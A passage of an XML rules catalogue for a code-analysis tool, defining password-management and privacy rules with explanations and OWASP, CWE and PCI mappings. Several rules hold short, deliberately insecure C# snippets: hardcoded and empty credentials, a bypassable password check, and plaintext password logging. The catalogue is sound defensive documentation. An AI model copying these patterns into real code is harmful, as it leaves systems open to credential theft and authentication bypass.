																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 256</em> <br></p>
																									   <p>[11]  <em>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_password_management_empty_password</key>
    <internalKey>Security Features/Password Management/Empty Password</internalKey>
    <name>Password Management: Empty Password</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Empty passwords can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to assign an empty string to a password variable. If the empty password is used to successfully authenticate against another system, then the corresponding account's security is likely compromised because it accepts an empty password. If the empty password is merely a placeholder until a legitimate value can be assigned to the variable, then it can confuse anyone unfamiliar with the code and potentially cause problems on unexpected control flow paths.<br><br><br><br><b>Example 1:</b><br><br><pre><br>    ...<br>    NetworkCredential netCred = new NetworkCredential("scott", "", domain);<br>    ...<br></pre><br><br>If the code in Example 1 succeeds, it indicates that the network credential login "scott" is configured with an empty password, which can be easily guessed by an attacker. Even worse, once the program has shipped, updating the account to use a non-empty password will require a code change.<br><br><b>Example 2:</b> The code below initializes a password variable to an empty string, attempts to read a stored value for the password, and compares it against a user-supplied value.<br><br><pre><br>    ...<br>    string storedPassword = "";<br>    string temp;<br><br>    if ((temp = ReadPassword(storedPassword)) != null) {<br>        storedPassword = temp;<br>    }<br><br>    if(storedPassword.Equals(userPassword))<br>        // Access protected resources<br>        ...<br>    }<br>    ...<br></pre><br><br>If <code>readPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing an empty string for <code>userPassword</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 259</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 259</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_password_management_hardcoded_password</key>
    <internalKey>Security Features/Password Management/Hardcoded Password</internalKey>
    <name>Password Management: Hardcoded Password</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Hardcoded passwords can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.<br><br><b>Example:</b> The following code uses a hardcoded password to create a network credential:<br><br><pre><br>...<br>NetworkCredential netCred =<br>           new NetworkCredential("scott", "tiger", domain);<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the network credential user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the executable for the application they can disassemble the code, which will contain the values of the passwords used.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 259, CWE ID 798</em> <br></p>
																									   <p>[11]  <em>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 259</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 798</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 798</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_password_management_null_password</key>
    <internalKey>Security Features/Password Management/Null Password</internalKey>
    <name>Password Management: Null Password</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Null passwords can compromise security.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Assigning null to password variables is a bad idea because it can allow attackers to bypass password verification or might indicate that resources are protected by an empty password.<br><br><br><br><b>Example:</b> The code below initializes a password variable to null, attempts to read a stored value for the password, and compares it against a user-supplied value.<br><br><pre><br>    ...<br>    string storedPassword = null;<br>    string temp;<br><br>    if ((temp = ReadPassword(storedPassword)) != null) {<br>        storedPassword = temp;<br>    }<br><br>    if(Utils.VerifyPassword(storedPassword, userPassword))<br>        // Access protected resources<br>        ...<br>    }<br>    ...<br></pre><br><br>If <code>ReadPassword()</code> fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing a null value for <code>userPassword</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 259</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 259</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_password_management_password_in_comment</key>
    <internalKey>Security Features/Password Management/Password in Comment</internalKey>
    <name>Password Management: Password in Comment</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing passwords or password details in plaintext anywhere in the system or system code can compromise system security in a way that cannot be easily remedied.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords.  Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.<br><br><br><b>Example:</b> The following comment specifies the default password to connect to a database:<br><br><pre><br>...<br>// Default username for database connection is "scott"<br>// Default password for database connection is "tiger"<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I, APP3350 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 615</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_password_management_weak_cryptography</key>
    <internalKey>Security Features/Password Management/Weak Cryptography</internalKey>
    <name>Password Management: Weak Cryptography</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Obscuring a password with a trivial encoding does not protect the password.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Password management issues occur when a password is stored in plaintext in an application's configuration files or other data store. A programmer can attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password.<br><br><b>Example:</b> The following code reads a password from the registry and uses the password to create a new network credential.<br><br><pre><br>...<br>string value = regKey.GetValue(passKey).ToString());<br>byte[] decVal = Convert.FromBase64String(value);<br>NetworkCredential netCred =<br>  new NetworkCredential(username,decVal.toString(),domain);<br>...<br></pre><br><br>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of <code>password</code>. If a devious employee has access to this information, they can use it to break into the system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3150.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 261</em> <br></p>
																									   <p>[11]  <em>How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M6 Broken Cryptography</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_privacy_violation</key>
    <internalKey>Security Features/Privacy Violation</internalKey>
    <name>Privacy Violation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Mishandling private information, such as customer passwords or social security numbers, can compromise user privacy and is often illegal. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Privacy violations occur when:<br><br>1. Private user information enters the program.<br><br>2. The data is written to an external location, such as the console, file system or network.<br><br><b>Example:</b> The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the <code>getPassword()</code> function returns the user-supplied plaintext password associated with the account.<br><br><pre><br>pass = GetPassword();<br>...<br>dbmsLog.WriteLine(id+":"+pass+":"+type+":"+tstamp);<br></pre><br><br>The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.<br><br>Private data can enter a program in a variety of ways:<br><br>- Directly from the user in the form of a password or personal information<br><br>- Accessed from a database or other data store by the application<br><br>- Indirectly from a partner or other third party<br><br>Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.<br><br>Security and privacy concerns often seem to compete with each other. From a security perspective, you should record all important operations so that any anomalous activity can later be identified. However, when private data is involved, this practice can create risk.<br><br>Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable to store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted. For example, in 2004, an unscrupulous employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [1].<br><br>In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated. Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations:<br><br>- Safe Harbor Privacy Framework [3]<br><br>- Gramm-Leach Bliley Act (GLBA) [4]<br><br>- Health Insurance Portability and Accountability Act (HIPAA) [5]<br><br>- California SB-1386 [6]<br><br>Despite these regulations, privacy violations continue to occur with alarming frequency.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[3] J. Oates <em>AOL man pleads guilty to selling 92m email addies</em> The Register<br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9]  <em>California SB-1386</em> Government of the State of California<br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 359</em> <br></p>
																									   <p>[11]  <em>Financial Privacy: The Gramm-Leach Bliley Act (GLBA)</em> Federal Trade Commission<br></p>
																									   <p>[12]  <em>Health Insurance Portability and Accountability Act (HIPAA)</em> U.S. Department of Human Services<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M2 Insecure Data Storage</em> <br></p>
																									   <p>[15]  <em>Privacy Initiatives</em> U.S. Federal Trade Commission<br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</em> <br></p>
																									   <p>[20]  <em>Safe Harbor Privacy Framework</em> U.S. Department of Commerce<br></p>
																									   <p>[21] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_privacy_violation_heap_inspection</key>
    <internalKey>Security Features/Privacy Violation/Heap Inspection</internalKey>
    <name>Privacy Violation: Heap Inspection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing sensitive data in an insecure manner makes it possible to extract the data via inspecting the heap.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Certain patterns in programming causes sensitive data to be stored in an insecure manner, making it possible to extract the data via inspecting the heap.<br><br>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A6 Sensitive Data Exposure</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3230.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 226</em> <br></p>
